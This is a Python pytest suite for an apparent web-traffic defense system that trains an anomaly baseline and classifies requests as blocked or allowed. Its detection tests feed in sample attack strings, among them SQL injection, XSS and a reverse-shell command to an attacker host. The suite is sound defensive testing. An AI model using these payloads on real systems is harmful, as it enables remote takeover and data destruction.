"""
Test suite for LurRenJiaDefenseSystem core functionality
"""

import pytest
import numpy as np
from src.defense_system import LurRenJiaDefenseSystem


class TestDefenseSystemInitialization:
    """Test defense system initialization"""
    
    def test_system_initialization(self):
        """Test that system initializes correctly"""
        system = LurRenJiaDefenseSystem()
        assert system is not None
        assert system.trained is False
        assert system.baseline is None
        assert system.event_history == []
        assert system.statistics['total_requests'] == 0
    
    def test_system_with_custom_contamination(self):
        """Test system initialization with custom contamination parameter"""
        system = LurRenJiaDefenseSystem(contamination=0.2)
        assert system is not None


class TestAIBaseline:
    """Test AI baseline training"""
    
    @pytest.fixture
    def system(self):
        """Provide a defense system instance"""
        return LurRenJiaDefenseSystem()
    
    def test_train_ai_baseline(self, system, capsys):
        """Test AI baseline training"""
        normal_data = np.random.randn(500, 2) * 10 + 50
        system.train_ai_baseline(normal_data)
        
        assert system.trained is True
        assert system.baseline is not None
        
        # Check that training message was printed
        captured = capsys.readouterr()
        assert "AI baseline trained" in captured.out
        assert "500" in captured.out
    
    def test_baseline_shape(self, system):
        """Test that baseline has correct shape"""
        normal_data = np.random.randn(1000, 2) * 10 + 50
        system.train_ai_baseline(normal_data)
        
        assert system.baseline.shape[0] == 1000
        assert system.baseline.shape[1] == 2


class TestStatistics:
    """Test statistics tracking"""
    
    @pytest.fixture
    def trained_system(self):
        """Provide a trained defense system"""
        system = LurRenJiaDefenseSystem()
        normal_data = np.random.randn(500, 2) * 10 + 50
        system.train_ai_baseline(normal_data)
        return system
    
    def test_statistics_initialization(self, trained_system):
        """Test that statistics are initialized"""
        stats = trained_system.get_statistics()
        assert stats['total_requests'] == 0
        assert stats['blocked_requests'] == 0
        assert stats['allowed_requests'] == 0
        assert stats['block_rate'] == 0
    
    def test_statistics_after_request(self, trained_system):
        """Test statistics after analyzing request"""
        normal_payload = "GET /api/users"
        features = np.array([50, 15])
        
        trained_system.analyze_incoming_traffic("192.168.1.1", normal_payload, features)
        stats = trained_system.get_statistics()
        
        assert stats['total_requests'] == 1
        assert stats['blocked_requests'] >= 0
        assert stats['allowed_requests'] >= 0
        assert stats['total_requests'] == stats['blocked_requests'] + stats['allowed_requests']


class TestEventHistory:
    """Test event history tracking"""
    
    @pytest.fixture
    def trained_system(self):
        """Provide a trained defense system"""
        system = LurRenJiaDefenseSystem()
        normal_data = np.random.randn(500, 2) * 10 + 50
        system.train_ai_baseline(normal_data)
        return system
    
    def test_event_history_tracking(self, trained_system):
        """Test that events are recorded in history"""
        payload = "GET /api/data"
        features = np.array([50, 15])
        
        trained_system.analyze_incoming_traffic("192.168.1.1", payload, features)
        
        events = trained_system.get_event_history()
        assert len(events) == 1
        assert events[0]['ip'] == "192.168.1.1"
        assert events[0]['action'] in ['blocked', 'allowed']
        assert 'timestamp' in events[0]
        assert 'threat_type' in events[0]
        assert 'risk_score' in events[0]
    
    def test_event_history_limit(self, trained_system):
        """Test event history retrieval with limit"""
        for i in range(5):
            payload = f"GET /api/request_{i}"
            features = np.array([50, 15])
            trained_system.analyze_incoming_traffic(f"192.168.1.{i+1}", payload, features)
        
        # Get all events
        all_events = trained_system.get_event_history()
        assert len(all_events) == 5
        
        # Get limited events
        limited_events = trained_system.get_event_history(limit=3)
        assert len(limited_events) == 3
    
    def test_event_has_required_fields(self, trained_system):
        """Test that each event has required fields"""
        payload = "<script>alert('test')</script>"
        features = np.array([50, 15])
        
        trained_system.analyze_incoming_traffic("192.168.1.1", payload, features)
        
        event = trained_system.get_event_history()[0]
        required_fields = ['timestamp', 'ip', 'action', 'threat_type', 'risk_score', 'payload']
        
        for field in required_fields:
            assert field in event


class TestThreatDetection:
    """Test threat detection functionality"""
    
    @pytest.fixture
    def trained_system(self):
        """Provide a trained defense system"""
        system = LurRenJiaDefenseSystem()
        normal_data = np.random.randn(500, 2) * 10 + 50
        system.train_ai_baseline(normal_data)
        return system
    
    def test_analyze_normal_traffic(self, trained_system):
        """Test analyzing normal traffic"""
        result = trained_system.analyze_incoming_traffic(
            "192.168.1.1",
            "GET /api/users",
            np.array([50, 15])
        )
        
        assert 'ip' in result
        assert 'action' in result
        assert 'threat_type' in result
        assert 'risk_score' in result
        assert 'reason' in result
    
    def test_analyze_sql_injection(self, trained_system):
        """Test SQL injection detection"""
        result = trained_system.analyze_incoming_traffic(
            "192.168.1.1",
            "'; DROP TABLE users; --",
            np.array([50, 15])
        )
        
        assert result['threat_type'] == "SQL_INJECTION"
        assert result['action'] == 'blocked'
        assert result['risk_score'] > 0.7
    
    def test_analyze_xss_attack(self, trained_system):
        """Test XSS attack detection"""
        result = trained_system.analyze_incoming_traffic(
            "192.168.1.1",
            "<script>alert('XSS')</script>",
            np.array([50, 15])
        )
        
        assert result['threat_type'] == "XSS"
        assert result['action'] == 'blocked'
        assert result['risk_score'] > 0.7
    
    def test_analyze_command_injection(self, trained_system):
        """Test command injection detection"""
        result = trained_system.analyze_incoming_traffic(
            "192.168.1.1",
            "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            np.array([50, 15])
        )
        
        assert result['threat_type'] == "COMMAND_INJECTION"
        assert result['action'] == 'blocked'
        assert result['risk_score'] > 0.8


class TestBatchAnalysis:
    """Test batch analysis functionality"""
    
    @pytest.fixture
    def trained_system(self):
        """Provide a trained defense system"""
        system = LurRenJiaDefenseSystem()
        normal_data = np.random.randn(500, 2) * 10 + 50
        system.train_ai_baseline(normal_data)
        return system
    
    def test_batch_analyze(self, trained_system):
        """Test batch analysis of multiple requests"""
        traffic_data = [
            {'ip': '192.168.1.1', 'payload': 'GET /api/users', 'features': np.array([50, 15])},
            {'ip': '192.168.1.2', 'payload': 'POST /api/data', 'features': np.array([52, 12])},
            {'ip': '10.0.0.1', 'payload': '<script>alert(1)</script>', 'features': np.array([48, 10])},
        ]
        
        results = trained_system.batch_analyze(traffic_data)
        
        assert len(results) == 3
        assert all('ip' in r for r in results)
        assert all('action' in r for r in results)


class TestErrorHandling:
    """Test error handling"""
    
    def test_analyze_before_training(self):
        """Test that analysis without training returns appropriate response"""
        system = LurRenJiaDefenseSystem()
        
        result = system.analyze_incoming_traffic(
            "192.168.1.1",
            "GET /api/users",
            np.array([50, 15])
        )
        
        assert result['action'] == 'blocked'
        assert result['reason'] == 'System not trained'
    
    def test_invalid_features_shape(self):
        """Test handling of invalid feature shapes"""
        system = LurRenJiaDefenseSystem()
        normal_data = np.random.randn(500, 2) * 10 + 50
        system.train_ai_baseline(normal_data)
        
        # Try with wrong number of features
        with pytest.raises(ValueError):
            system.analyze_incoming_traffic(
                "192.168.1.1",
                "GET /api/users",
                np.array([50, 15, 20])  # 3 features instead of 2
            )
